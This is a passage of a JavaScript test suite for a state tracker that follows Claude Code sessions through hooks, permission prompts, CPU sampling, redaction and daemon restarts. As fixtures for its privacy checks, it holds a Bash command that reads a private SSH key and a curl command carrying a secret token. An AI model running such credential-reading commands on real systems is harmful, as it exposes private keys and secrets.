  assert.equal(h.L().step.started_at, T0 + 300);
  h.hook('PostToolUse', { prompt_id: 'p1', tool: tool('Grep', 'g', { pattern: 'rail' }), ts: T0 + 350 });
  assert.equal(h.L().step.label, 'Read · b.js', 'the older one is still running');
  // A subagent's tool is progress, never the conversation's step.
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Edit', 'e', { file_path: 'c.js' }), ts: T0 + 900, agent: { id: 'a1', type: 'Explore' } });
  assert.equal(h.L().step.label, 'Read · b.js');
  assert.equal(h.L().last_activity_at, T0 + 900);
});

function permutations(xs) {
  if (xs.length <= 1) return [xs.slice()];
  const out = [];
  xs.forEach((x, i) => { for (const p of permutations([...xs.slice(0, i), ...xs.slice(i + 1)])) out.push([x, ...p]); });
  return out;
}

test('arrival order never changes the outcome: every order of a turn\'s async hooks gives one live state', () => {
  const ask = tool('Bash', 'tb', { command: 'npm publish' });
  const scenarios = {
    // Two tools raced their hooks; one still runs.
    tools: [
      ['PreToolUse', { tool: tool('Read', 'ta', { file_path: 'a.js' }), ts: T0 + 10 }],
      ['PostToolUse', { tool: tool('Read', 'ta', { file_path: 'a.js' }), ts: T0 + 20 }],
      ['PreToolUse', { tool: tool('Grep', 'tg', { pattern: 'x' }), ts: T0 + 30 }],
      ['PreToolUse', { tool: tool('Edit', 'te', { file_path: 'e.js' }), ts: T0 + 40 }],
      ['PostToolUse', { tool: tool('Grep', 'tg', { pattern: 'x' }), ts: T0 + 50 }],
    ],
    // An ask with its own PreToolUse delivered after it: waiting, whatever the order.
    pending: [
      ['PreToolUse', { tool: tool('Read', 'ta', { file_path: 'a.js' }), ts: T0 + 10 }],
      ['PostToolUse', { tool: tool('Read', 'ta', { file_path: 'a.js' }), ts: T0 + 20 }],
      ['PermissionRequest', { tool: ask, ts: T0 + 100 }],
      ['PreToolUse', { tool: ask, ts: T0 + 104 }],
    ],
    // ...answered: the call ran and ended.
    answered: [
      ['PermissionRequest', { tool: ask, ts: T0 + 100 }],
      ['PreToolUse', { tool: ask, ts: T0 + 104 }],
      ['PostToolUse', { tool: ask, ts: T0 + 900 }],
      ['PreCompact', { ts: T0 + 950 }],
      ['PreToolUse', { tool: tool('Read', 'tz', { file_path: 'z.js' }), ts: T0 + 990 }],
    ],
  };
  for (const [name, events] of Object.entries(scenarios)) {
    const seenStates = new Set();
    for (const order of permutations(events)) {
      const w = wired({ pid: null });
      w.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'go' } });
      w.clock.set(T0 + 5000);
      for (const [event, fields] of order) w.hook(event, { prompt_id: 'p1', ...fields });
      seenStates.add(stableKey(w.L()));
      seenStates.add(stableKey(w.model.serializeLive(C)) === stableKey({ ...w.L(), rev: w.model.serializeLive(C).rev }) ? 'model-agrees' : 'model-differs');
    }
    assert.equal(seenStates.size, 2, `${name}: ${[...seenStates].join('\n')}`);
    assert.ok(seenStates.has('model-agrees'), name);
  }
});

test('arrival order never changes the outcome, the sessions file\'s reads included', () => {
  const call = tool('Bash', 'tb', { command: 'ls' });
  const events = [
    (h) => h.hook('PermissionRequest', { tool: call, ts: T0 + 100 }),
    (h) => h.hook('PreToolUse', { tool: call, ts: T0 + 101 }),
    (h) => h.hook('PreToolUse', { tool: tool('Read', 'tr', { file_path: 'a.js' }), ts: T0 + 50 }),
    (h) => h.hook('PostToolUse', { tool: tool('Read', 'tr', { file_path: 'a.js' }), ts: T0 + 60 }),
  ];
  // The two reads keep their own order (a later read never comes first); the hooks go anywhere.
  const reads = [(h) => h.file('waiting', { waitingFor: 'permission prompt', statusUpdatedAt: T0 + 95 })];
  const outcomes = new Set();
  for (const order of permutations([...events, ...reads])) {
    const h = harness();
    h.prompt();
    h.clock.set(T0 + 5000);
    for (const step of order) step(h);
    outcomes.add(stableKey(h.L()));
    assert.equal(h.state(), 'waiting');
  }
  assert.equal(outcomes.size, 1);
});

test('an envelope delivered twice changes nothing', () => {
  const h = harness({ pid: null });
  h.prompt();
  const env = h.envelope('PermissionRequest', { tool: tool('Bash', 'tb', { command: 'ls' }) });
  h.live.ingest(C, env);
  const before = h.transitions.length;
  h.live.ingest(C, env);
  h.live.ingest(C, { ...env });
  assert.equal(h.transitions.length, before);
  const post = h.envelope('PostToolUse', { tool: tool('Bash', 'tb', { command: 'ls' }), ts: T0 + 5 });
  h.live.ingest(C, post);
  h.live.ingest(C, post);
  assert.equal(h.ofOp('waiting-cleared').length, 1);
});

test('two envelopes of one millisecond are two envelopes: two agents\' asks, two calls of one message, two resolutions', () => {
  // The main agent's ask and a subagent's, neither with a tool_use_id (V3: PermissionRequest carries none).
  const h = harness({ pid: null });
  h.prompt();
  h.clock.set(T0 + 100);
  h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', null, { command: 'a' }, { input_hash: 'ha' }) });
  h.hook('PermissionRequest', { prompt_id: 'p1', agent: { id: 'agent-b', type: 'general-purpose' },
    tool: tool('Write', null, { file_path: '/x' }, { input_hash: 'hb' }) });
  h.clock.set(T0 + 200);
  h.hook('PostToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tu1', { command: 'a' }, { input_hash: 'ha' }) });
  assert.equal(h.state(), 'waiting', 'the main agent\'s ask cleared; the subagent\'s still waits');
  assert.deepEqual(h.L().waiting, { kind: 'permission', tool: 'Write', summary: 'Write(/x)', pending: true });

  // Two calls of one message that both need permission (V27): one agent, one millisecond, two input_hashes.
  const m = harness({ pid: null });
  m.prompt();
  m.clock.set(T0 + 100);
  m.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', null, { command: 'a' }, { input_hash: 'ha' }) });
  m.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', null, { command: 'b' }, { input_hash: 'hb' }) });
  m.clock.set(T0 + 200);
  m.hook('Stop', { prompt_id: 'p1' });
  assert.equal(m.ofOp('waiting-cleared').length, 2, 'two asks were pending, and each clears');

  // Two asks the asks domain resolved in one millisecond: both clear.
  const r = harness({ pid: null });
  r.prompt();
  r.clock.set(T0 + 100);
  r.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', null, { command: 'a' }, { input_hash: 'ha' }),
    ask: { id: 'ask_aaaaaaaaaaa1', kind: 'permission' } });
  r.hook('PermissionRequest', { prompt_id: 'p1', agent: { id: 'agent-b', type: 'general-purpose' },
    tool: tool('Write', null, { file_path: '/x' }, { input_hash: 'hb' }), ask: { id: 'ask_aaaaaaaaaaa2', kind: 'permission' } });
  r.clock.set(T0 + 200);
  r.hook('PermissionResolved', { ask: { id: 'ask_aaaaaaaaaaa1', by: 'terminal' }, synthetic: true });
  r.hook('PermissionResolved', { ask: { id: 'ask_aaaaaaaaaaa2', by: 'terminal' }, synthetic: true });
  assert.deepEqual(r.ofOp('waiting-cleared').map((t) => t.ask_id), ['ask_aaaaaaaaaaa1', 'ask_aaaaaaaaaaa2']);
  assert.equal(r.state(), 'working');
});

// ── quiet ─────────────────────────────────────────────────────────────────────

async function quietRun({ pct, pid = PID, toolCall = false, until }) {
  const h = harness({ pid, rule: cpuRate(pct) });
  h.live.start();
  await h.clock.advance(0); // the first sample, at once
  h.prompt();
  if (toolCall) h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tu1', { command: 'npm test' }) });
  await h.clock.advance(until);
  const l = h.L();
  await h.live.stop();
  return l;
}

test('quiet, no tool running, with CPU data: QUIET_MODEL_MS without progress and the CPU under CPU_TICK_PCT for QUIET_CPU_MS', async () => {
  assert.equal((await quietRun({ pct: 1, until: QUIET_MODEL_MS - 1 })).quiet, null);
  const q = await quietRun({ pct: 1, until: QUIET_MODEL_MS });
  assert.deepEqual(q.quiet, { since: T0, reason: 'no-activity' });
  assert.equal(q.state, 'working', 'quiet is a kind of working, never an end');
  assert.equal(q.process.cpu_pct, 1);
  // A long think keeps the TUI's spinner ticking (F7): not quiet.
  assert.equal((await quietRun({ pct: CPU_TICK_PCT + 2, until: 30 * 60000 })).quiet, null);
});

test('quiet, a tool running, with CPU data: only after QUIET_TOOL_MS without progress and an idle CPU', async () => {
  const at9 = await quietRun({ pct: 1, toolCall: true, until: 9 * 60000 });
  assert.equal(at9.quiet, null, 'a long `npm test` reads `Bash · 9:00`, not quiet');
  assert.equal(at9.step.label, 'Bash · npm test');
  assert.equal((await quietRun({ pct: 1, toolCall: true, until: QUIET_TOOL_MS - 1 })).quiet, null);
  assert.ok((await quietRun({ pct: 1, toolCall: true, until: QUIET_TOOL_MS })).quiet);
  assert.equal((await quietRun({ pct: 4, toolCall: true, until: QUIET_TOOL_MS * 3 })).quiet, null, 'a busy CPU is not quiet');
});

test('quiet with no CPU data: the time conditions alone, doubled', async () => {
  assert.equal((await quietRun({ pct: 0, pid: null, until: QUIET_MODEL_MS * NO_CPU_FACTOR - 1 })).quiet, null);
  const q = await quietRun({ pct: 0, pid: null, until: QUIET_MODEL_MS * NO_CPU_FACTOR });
  assert.deepEqual(q.quiet, { since: T0, reason: 'no-activity' });
  assert.equal(q.process, null);
  assert.equal((await quietRun({ pct: 0, pid: null, toolCall: true, until: QUIET_TOOL_MS * NO_CPU_FACTOR - 1 })).quiet, null);
  assert.ok((await quietRun({ pct: 0, pid: null, toolCall: true, until: QUIET_TOOL_MS * NO_CPU_FACTOR })).quiet);
});

test('CPU data that stopped coming is no CPU data; new progress ends quiet', async () => {
  const h = harness({ rule: cpuRate(1) });
  h.live.start();
  await h.clock.advance(0);
  h.prompt();
  await h.clock.advance(20000);
  h.sampler.set(NO_VERDICT); // the machine is loaded: every sample fails from here
  await h.clock.advance(QUIET_MODEL_MS);
  assert.equal(h.L().process.cpu_pct, null, `stale after ${CPU_STALE_MS} ms`);
  assert.equal(h.L().quiet, null, 'no CPU data: the doubled rule');
  await h.clock.advance(QUIET_MODEL_MS);
  assert.ok(h.L().quiet);
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Read', 'tr', { file_path: 'a.js' }) });
  assert.equal(h.L().quiet, null);
  assert.equal(h.L().last_activity_at, h.clock.now());
  await h.live.stop();
});

// ── progress from the other sources ──────────────────────────────────────────

test('progress from the transcript, agents, workflows, task output and the sessions file feeds last_activity_at', () => {
  const h = harness();
  h.prompt();
  h.clock.set(T0 + 10000);
  h.live.noteActivity(C, T0 + 1000, 'transcript');
  h.live.noteActivity(C, T0 + 2000, 'agent');
  h.live.noteActivity(C, T0 + 3000, 'task_output');
  h.live.noteActivity(S, T0 + 4000, 'workflow'); // by session id too
  h.live.noteActivity(C, T0 + 99999999, 'transcript'); // never in the future
  const l = h.L();
  assert.equal(l.evidence.transcript_at, T0 + 10000);
  assert.equal(l.evidence.task_output_at, T0 + 3000);
  assert.equal(l.last_activity_at, T0 + 10000);
  h.live.noteActivity('nobody', T0, 'transcript'); // an unknown conversation is not made up
  assert.deepEqual(h.live.conversations(), [C]);
});

test('a reply that lands mid-turn is the Reply step, until a newer tool runs or ends', () => {
  const h = harness();
  h.prompt();
  h.clock.set(T0 + 5000);
  h.live.onChanges(S, [{ type: 'item', uuid: 'u1', ts: T0 + 400, item: { id: 'r_m1', kind: 'reply', text: 'Looking…' } }]);
  assert.deepEqual(h.L().step, { kind: 'Reply', tool: null, label: 'Reply', started_at: T0 + 400 });
  assert.equal(h.L().evidence.transcript_at, T0 + 400);
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Read', 'tr', { file_path: 'a.js' }), ts: T0 + 600 });
  assert.equal(h.L().step.kind, 'Read');
  h.hook('PostToolUse', { prompt_id: 'p1', tool: tool('Read', 'tr', { file_path: 'a.js' }), ts: T0 + 700 });
  assert.equal(h.L().step, null, 'the reply is older than the tool that ended');
});

// ── the sampling cadence ──────────────────────────────────────────────────────

test('sampling: at once for a new pid, every 5 s while anything is active, every 15 s otherwise, never with no linked pid', async () => {
  const h = harness();
  h.live.start();
  assert.deepEqual(h.clock.delays(), [0], 'a pid linked since the last sample is sampled at once');
  await h.clock.advance(0);
  assert.equal(h.sampler.calls.length, 1);
  assert.deepEqual(h.sampler.calls[0], [PID]);
  assert.equal(h.state(), 'idle');
  assert.ok(h.clock.delays().includes(PROC_SAMPLE_IDLE_MS));
  h.prompt();
  assert.ok(h.clock.delays().includes(PROC_SAMPLE_ACTIVE_MS), 'working: the next sample within 5 s');
  await h.clock.advance(PROC_SAMPLE_ACTIVE_MS);
  assert.equal(h.sampler.calls.length, 2);
  await h.clock.advance(PROC_SAMPLE_ACTIVE_MS * 3);
  assert.equal(h.sampler.calls.length, 5);
  h.hook('Stop', { prompt_id: 'p1' });
  h.closeTurn('p1');
  assert.equal(h.state(), 'idle');
  await h.clock.advance(PROC_SAMPLE_ACTIVE_MS);
  await h.clock.advance(PROC_SAMPLE_IDLE_MS - 1);
  const n = h.sampler.calls.length;
  await h.clock.advance(PROC_SAMPLE_IDLE_MS);
  assert.equal(h.sampler.calls.length, n + 1, 'idle: every 15 s');
  await h.live.stop();
  assert.equal(h.clock.count(), 0, 'stop() leaves no timer');

  const none = harness({ pid: null });
  none.live.start();
  none.prompt();
  await none.clock.advance(120000);
  assert.deepEqual(none.sampler.calls, [], 'never with no linked pid');
  await none.live.stop();
});

test('one sample in flight at a time; a relink drops the answer meant for the old process', async () => {
  let resolve;
  const calls = [];
  const live = createLive({
    now: () => T0,
    sampleProcs: (pids) => { calls.push(pids); return new Promise((r) => { resolve = r; }); },
    isPidAlive: () => false,
    openTurnOf: () => null,
  });
  live.onConversation({ change: 'added', conversation: { id: C, process: { pid: PID, proc_start: PROC_START } } });
  const a = live.sampleNow();
  const b = live.sampleNow();
  assert.strictEqual(a, b);
  assert.equal(calls.length, 1);
  live.onConversation({ change: 'linked', conversation: { id: C, process: { pid: PID + 7, proc_start: PROC_START } } });
  resolve(new Map([[PID, alive(0, 'S+', START_MS + 99999)]])); // would be a mismatch, but for the old pid
  await a;
  assert.notEqual(live.stateOf(C), 'ended');
});

test('stop() is idempotent, clears every timer and turns inputs off; start() turns them back on', async () => {
  const h = harness();
  h.live.start();
  h.prompt();
  h.file('busy', { updatedAt: T0 });
  h.clock.set(T0 + 1000);
  h.file('idle');
  assert.ok(h.clock.count() > 0);
  await h.live.stop();
  await h.live.stop();
  assert.equal(h.clock.count(), 0);
  const n = h.transitions.length;
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Read', 'tr', { file_path: 'a.js' }) });
  await h.clock.advance(60000);
  assert.equal(h.transitions.length, n, 'stopped: nothing in, nothing out');
  h.live.start();
  assert.ok(h.clock.count() > 0);
  await h.live.stop();
});

// ── what leaves this file ─────────────────────────────────────────────────────

test('transitions are content-free: no label, command, question or prompt text', async () => {
  const h = harness({ pid: null });
  h.prompt();
  h.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tu1', { command: 'cat ~/.ssh/id_rsa' }) });
  h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('AskUserQuestion', 'tq', { questions: [{ question: 'Which secret key?' }] }), ask: { id: 'ask_cccccccccccc' } });
  h.hook('PostToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tu1', { command: 'cat ~/.ssh/id_rsa' }), ts: T0 + 10 });
  const text = JSON.stringify(h.transitions);
  for (const s of ['id_rsa', 'cat ', 'Which secret', 'Bash ·', 'go']) assert.ok(!text.includes(s), s);
  const allowed = new Set(['kind', 'op', 'conversation_id', 'session_id', 'pid', 'state', 'prev', 'waiting_kind', 'ask_id', 'by',
    'turn_id', 'outcome', 'session_ids']);
  for (const t of h.transitions) for (const k of Object.keys(t)) assert.ok(allowed.has(k), `${t.op}: ${k}`);
});

test('content passes the redactor before it is kept; without one it is not kept at all', () => {
  const h = harness({ pid: null });
  h.prompt();
  h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'curl -H "x: SECRET_token123" api' }) });
  assert.equal(h.L().waiting.summary, 'Bash(curl -H "x: [MASK]" api)');

  const bare = harness({ pid: null, withRedact: false });
  bare.prompt();
  bare.hook('PreToolUse', { prompt_id: 'p1', tool: tool('Bash', 'tu1', { command: 'ls' }) });
  assert.deepEqual(bare.L().step, { kind: 'Bash', tool: 'Bash', label: null, started_at: T0 }, 'the kind stays; the text goes');
  bare.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('Bash', 'tb', { command: 'ls' }) });
  assert.equal(bare.L().waiting.summary, null);
  assert.equal(bare.L().waiting.kind, 'permission');
});

test('the state transition names the conversation, its session and pid, and the wait', () => {
  const h = harness();
  h.prompt();
  h.hook('PermissionRequest', { prompt_id: 'p1', tool: tool('AskUserQuestion', 'tq', { questions: [{ question: 'A or B?' }] }), ask: { id: 'ask_dddddddddddd' } });
  h.file('waiting', { waitingFor: 'input needed' });
  assert.deepEqual(h.ofOp('state').at(-1), { kind: 'mirror', op: 'state', conversation_id: C, session_id: S, pid: PID,
    state: 'question', prev: 'working', waiting_kind: 'question', ask_id: 'ask_dddddddddddd' });
});

test('last_turn: the newest closed turn, read fresh, with its code once it is ready', () => {
  const h = harness();
  h.prompt();
  h.clock.set(T0 + 4000);
  h.closeTurn('p1', 'done', { reply_preview: 'The rail now collapses to 56px', code: { status: 'pending' } });
  assert.deepEqual(h.L().last_turn, { id: 'p1', outcome: 'done', ended_at: T0 + 4000, code: null, reply_preview: 'The rail now collapses to 56px',
    ended_by: null });
  h.turns.close(C, 'p1', 'done', T0 + 4000, { reply_preview: 'The rail now collapses to 56px', code: { status: 'ready', files: 3, additions: 40, deletions: 2 } });
  h.live.noteActivity(C, T0 + 4100, 'transcript');
  assert.deepEqual(h.L().last_turn.code, { files: 3, additions: 40, deletions: 2 });
});

test('last_turn.ended_by: who stopped an interrupted turn, from its header; null for any other end', async () => {
  // §7.3 words an idle after a stop from the browser ('web' or 'hook') from the live state alone.
  for (const [given, want] of [['web', 'web'], ['hook', 'hook'], ['terminal', 'terminal'], ['someone', null], [undefined, null]]) {
    const h = harness();
    h.prompt();
    h.clock.set(T0 + 1000);
    h.closeTurn('p1', 'interrupted', given === undefined ? {} : { ended_by: given });
    assert.equal(h.L().last_turn.ended_by, want, String(given));
  }
  // Only an interrupted turn has one (as the turn machine sets it).
  const d = harness();
  d.prompt();
  d.closeTurn('p1', 'done', { ended_by: 'web' });
  assert.equal(d.L().last_turn.ended_by, null);

  // Wired: a status close says 'terminal' (no control event names another until tranche 4), and the
  // real model keeps it; a turn that ended with its Stop says nothing.
  const w = wired();
  w.live.start();
  w.file('busy', { updatedAt: T0 });
  w.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'go' } });
  w.clock.set(T0 + 2000);
  w.file('idle');
  await w.clock.advance(STOP_GRACE_MS);
  assert.equal(w.L().last_turn.outcome, 'interrupted');
  assert.equal(w.L().last_turn.ended_by, 'terminal');
  assert.equal(w.model.serializeLive(C).last_turn.ended_by, 'terminal');
  w.clock.set(T0 + 10000);
  w.hook('UserPromptSubmit', { prompt_id: 'p2', prompt: { author: 'user', text: 'again' } });
  w.clock.set(T0 + 11000);
  w.hook('Stop', { prompt_id: 'p2' });
  assert.equal(w.L().last_turn.id, 'p2');
  assert.equal(w.L().last_turn.ended_by, null);
  assert.equal(w.model.serializeLive(C).last_turn.ended_by, null, 'a merge never keeps the old turn\'s');
  await w.live.stop();
});

test('a removed or merged conversation is dropped; its sessions no longer resolve', () => {
  const h = harness();
  assert.ok(h.L());
  h.live.onConversation({ change: 'merged', conversation: { id: C, merged_into: 'conv-0' } });
  assert.equal(h.live.liveOf(C), null);
  assert.equal(h.live.liveOf(S), null);
  assert.deepEqual(h.live.conversations(), []);
});

test('ingest stays well under 5 ms an envelope (asserted only under WEB_CHAT_PERF=1)', (t) => {
  const h = harness({ pid: null });
  h.prompt();
  const n = 5000;
  const t0 = process.hrtime.bigint();
  for (let i = 0; i < n; i++) {
    h.hook(i % 2 ? 'PostToolUse' : 'PreToolUse', { prompt_id: 'p1', ts: T0 + i, tool: tool('Read', `t${i >> 1}`, { file_path: `f${i}.js` }) });
  }
  const perMs = Number(process.hrtime.bigint() - t0) / 1e6 / n;
  t.diagnostic(`ingest: ${perMs.toFixed(3)} ms an envelope`);
  if (process.env.WEB_CHAT_PERF === '1') assert.ok(perMs < 5, `${perMs} ms`);
  assert.equal(h.state(), 'working');
});

// ── THE END OF A TURN WINS over an older sessions-file `busy` (U120) ──
// Claude Code leaves `busy` in its sessions file after a turn ends, and a
// background session's host ticks a few percent of CPU all the time: a busy
// written at or before the last turn's end is stale whatever the CPU does.

// A ticking process (5 % of a core) whose sessions file says busy from before
// the turn, wired to the real turn machine: a prompt, then its Stop.
// A `busy` written after the Stop is read after it (a read never dates a write
// later than itself).
async function endedTurn({ busyAt = T0 }) {
  const w = wired({ rule: cpuRate(5) });
  if (busyAt <= T0) w.file('busy', { updatedAt: busyAt });
  w.clock.set(T0 + 1000);
  w.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'go' } });
  assert.equal(w.state(), 'working', 'the open turn');
  w.clock.set(T0 + 5000);
  w.hook('Stop', { prompt_id: 'p1' });
  if (busyAt > T0) { w.clock.set(Math.max(T0 + 5000, busyAt)); w.file('busy', { updatedAt: busyAt }); }
  await w.live.sampleNow();
  w.clock.set(T0 + 15000);
  await w.live.sampleNow();
  assert.equal(w.L().process.cpu_pct, 5, 'the CPU ticks');
  return w;
}

test('a turn that has ended reads idle although the sessions file still says busy and the CPU ticks', async () => {
  const w = await endedTurn({ busyAt: T0 });
  assert.equal(w.L().last_turn.outcome, 'done');
  assert.equal(w.L().last_turn.ended_at, T0 + 5000);
  assert.equal(w.state(), 'idle', 'the busy was written before the Stop: stale');
  assert.equal(w.L().stale_status, true);
  assert.equal(w.L().turn_started_at, null);
  assert.equal(w.L().step, null);
  // Later reads of the same file change nothing, however long the CPU ticks.
  w.file('busy', { updatedAt: T0 });
  w.clock.set(T0 + 60000);
  await w.live.sampleNow();
  assert.equal(w.state(), 'idle');
  assert.equal(w.L().stale_status, true);

  // A busy written in the very millisecond of the Stop is no newer than it.
  const tie = await endedTurn({ busyAt: T0 + 5000 });
  assert.equal(tie.state(), 'idle');

  // The status write decides, when the file carries one: a later updatedAt
  // (another field written) does not freshen a busy set before the Stop.
  const st = await endedTurn({ busyAt: T0 });
  st.clock.set(T0 + 20000);
  st.file('busy', { updatedAt: T0 + 20000, statusUpdatedAt: T0 });
  assert.equal(st.state(), 'idle');
  assert.equal(st.L().stale_status, true);
});

test('a busy written after the last turn ended still reads working, under the same CPU and STALE_BUSY_MS rules', async () => {
  const w = await endedTurn({ busyAt: T0 + 6000 });
  assert.equal(w.state(), 'working', 'the next prompt started in the terminal before its UserPromptSubmit arrived');
  assert.equal(w.L().stale_status, false);

  // Written after the Stop, then read: the same, without a CPU.
  const f = harness({ pid: null });
  f.file('busy', { updatedAt: T0 });
  f.openTurn('p1', T0);
  f.clock.set(T0 + 3000);
  f.closeTurn('p1');
  f.clock.set(T0 + 4000);
  f.file('busy', { updatedAt: T0 + 4000 });
  assert.equal(f.state(), 'working');
  // Fresh, it still grows stale on the clock (STALE_BUSY_MS, no CPU here).
  f.clock.set(T0 + 4000 + STALE_BUSY_MS + 1);
  f.live.noteActivity(C, T0, 'transcript');
  assert.equal(f.state(), 'idle');
  assert.equal(f.L().stale_status, true);

  // Without a status write time, a status change between two reads is the write.
  const r = harness({ pid: null });
  r.file('idle');
  r.openTurn('p1', T0);
  r.clock.set(T0 + 3000);
  r.closeTurn('p1');
  r.clock.set(T0 + 4000);
  r.file('busy');
  assert.equal(r.state(), 'working', 'idle → busy seen after the close');
});

test('an open turn is working whatever an old busy says', async () => {
  const h = harness({ rule: cpuRate(0.5) });
  h.file('busy', { updatedAt: T0 - 20 * 86400000 });
  h.openTurn('p1', T0);
  h.clock.set(T0 + 1000);
  h.closeTurn('p1');
  assert.equal(h.state(), 'idle');
  h.clock.set(T0 + 2000);
  h.prompt('p2');
  assert.equal(h.state(), 'working');
  h.clock.set(T0 + 20000);
  await h.sample();
  h.clock.set(T0 + 40000);
  await h.sample();
  assert.equal(h.state(), 'working', 'the open turn, the CPU low and the busy old');
  assert.equal(h.L().stale_status, false);
});

test('no clock is armed for a busy the last turn end made stale', async () => {
  const h = harness({ pid: null });
  h.live.start();
  h.file('busy', { updatedAt: T0 });
  assert.equal(h.state(), 'working');
  assert.ok(h.clock.count() > 0, 'a fresh busy runs out on the clock');
  h.openTurn('p1', T0 + 1000);
  h.clock.set(T0 + 5000);
  h.closeTurn('p1');
  assert.equal(h.state(), 'idle');
  assert.equal(h.clock.count(), 0, 'nothing left for time alone to change');
  await h.live.stop();
});

test('after a daemon restart, a restored last turn that ended after the busy was written reads idle', async () => {
  // The first daemon: a turn and its Stop, then the turn index it persists.
  const d1 = wired({ rule: cpuRate(5) });
  d1.file('busy', { updatedAt: T0 });
  d1.clock.set(T0 + 1000);
  d1.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'go' } });
  d1.clock.set(T0 + 5000);
  d1.hook('Stop', { prompt_id: 'p1' });
  const records = d1.tm.exportTurns(S);
  assert.equal(records.length, 1);
  assert.equal(records[0].header.status, 'done');

  // The second daemon: its own model, turn machine and live machine, the turns
  // restored from the index (no close is heard), the same sessions file.
  const clock = fakeClock(T0 + 60000);
  const sampler = fakeSampler(clock, cpuRate(5));
  const model = createModel({ redactor });
  const tm = createTurnMachine({ model, now: clock.now, transition: () => {} });
  const live = createLive({
    now: clock.now,
    timers: clock.timers,
    sampleProcs: (pids) => sampler.fn(pids),
    isPidAlive: () => true,
    redact: (s) => model.scrubText(s),
    openTurnOf: (cid) => { const id = tm.openTurnOf(cid); return id ? model.turn(id) : null; },
    turnOf: (id) => model.turn(tm.resolve(id)),
    turnsOf: (cid) => model.turnsOf(cid),
    onLive: (cid, l) => model.upsertLive(cid, l),
  });
  live.onConversation({ change: 'added', conversation: {
    id: C, current_session_id: S, sessions: [{ session_id: S }], process: { pid: PID, proc_start: PROC_START, entrypoint: 'cli' },
  } });
  assert.equal(tm.restoreTurns(C, records).restored, 1);
  live.noteSessionState(C, { status: 'busy', waitingFor: null, sessionId: S, procStart: PROC_START, entrypoint: 'cli', updatedAt: T0 });
  await live.sampleNow();
  clock.set(T0 + 75000);
  await live.sampleNow();
  const l = live.liveOf(C);
  assert.equal(l.process.cpu_pct, 5);
  assert.equal(l.state, 'idle', 'the restored turn ended after the busy was written');
  assert.equal(l.stale_status, true);
  assert.equal(l.last_turn.id, 'p1');
  assert.equal(l.last_turn.outcome, 'done');
  assert.equal(l.last_turn.ended_at, T0 + 5000);

  // The next prompt (its busy written now) is working again.
  live.noteSessionState(C, { status: 'busy', waitingFor: null, sessionId: S, procStart: PROC_START, entrypoint: 'cli', updatedAt: T0 + 75000 });
  assert.equal(live.stateOf(C), 'working');
  await live.stop();
});

test('after a daemon restart, the NEWEST restored turn end is the one a busy must beat', async () => {
  // Two turns; the file's busy was written for the second, after the first ended.
  const d1 = wired({ rule: cpuRate(5) });
  d1.file('busy', { updatedAt: T0 });
  d1.clock.set(T0 + 1000);
  d1.hook('UserPromptSubmit', { prompt_id: 'p1', prompt: { author: 'user', text: 'one' } });
  d1.clock.set(T0 + 5000);
  d1.hook('Stop', { prompt_id: 'p1' });
  d1.clock.set(T0 + 20000);
  d1.file('busy', { updatedAt: T0 + 20000 });
  d1.clock.set(T0 + 21000);
  d1.hook('UserPromptSubmit', { prompt_id: 'p2', prompt: { author: 'user', text: 'two' } });
  d1.clock.set(T0 + 30000);
  d1.hook('Stop', { prompt_id: 'p2' });
  const records = d1.tm.exportTurns(S);
  assert.equal(records.length, 2);

  const clock = fakeClock(T0 + 60000);
  const sampler = fakeSampler(clock, cpuRate(5));
  const model = createModel({ redactor });
  const tm = createTurnMachine({ model, now: clock.now, transition: () => {} });
  const live = createLive({
    now: clock.now,
    timers: clock.timers,
    sampleProcs: (pids) => sampler.fn(pids),
    isPidAlive: () => true,
    redact: (s) => model.scrubText(s),
    openTurnOf: (cid) => { const id = tm.openTurnOf(cid); return id ? model.turn(id) : null; },
    turnOf: (id) => model.turn(tm.resolve(id)),
    turnsOf: (cid) => model.turnsOf(cid),
    onLive: (cid, l) => model.upsertLive(cid, l),
  });
  live.onConversation({ change: 'added', conversation: {
    id: C, current_session_id: S, sessions: [{ session_id: S }], process: { pid: PID, proc_start: PROC_START, entrypoint: 'cli' },
  } });
  assert.equal(tm.restoreTurns(C, records).restored, 2);
  live.noteSessionState(C, { status: 'busy', waitingFor: null, sessionId: S, procStart: PROC_START, entrypoint: 'cli', updatedAt: T0 + 20000 });
  await live.sampleNow();
  clock.set(T0 + 75000);
  await live.sampleNow();
  const l = live.liveOf(C);
  assert.equal(l.process.cpu_pct, 5);
  assert.equal(l.last_turn.id, 'p2', 'the newest closed turn, not the first');
  assert.equal(l.last_turn.ended_at, T0 + 30000);
  assert.equal(l.state, 'idle', 'the busy (T0+20 s) is older than the second turn end (T0+30 s)');
  assert.equal(l.stale_status, true);
  await live.stop();
});

test('a busy whose write time is unknown does not beat a known turn end, the CPU ticking', async () => {
  // First read after the Stop, the file carrying neither updatedAt nor
  // statusUpdatedAt: nothing dates the busy after the end, so it is stale.
  const h = harness({ rule: cpuRate(5) });
  h.openTurn('p1', T0);
  h.clock.set(T0 + 3000);
  h.closeTurn('p1');
  h.clock.set(T0 + 4000);
  h.file('busy');
  await h.sample();
  h.clock.set(T0 + 20000);
  await h.sample();
  assert.equal(h.L().process.cpu_pct, 5, 'the CPU ticks');
  assert.equal(h.L().evidence.sessions_file_at, null, 'no write time known');
  assert.equal(h.state(), 'idle');
  assert.equal(h.L().stale_status, true);
});

test('no test in this file spawned a real ps (the sampler is always injected)', () => {
  assert.deepEqual(psCalls, []);
});
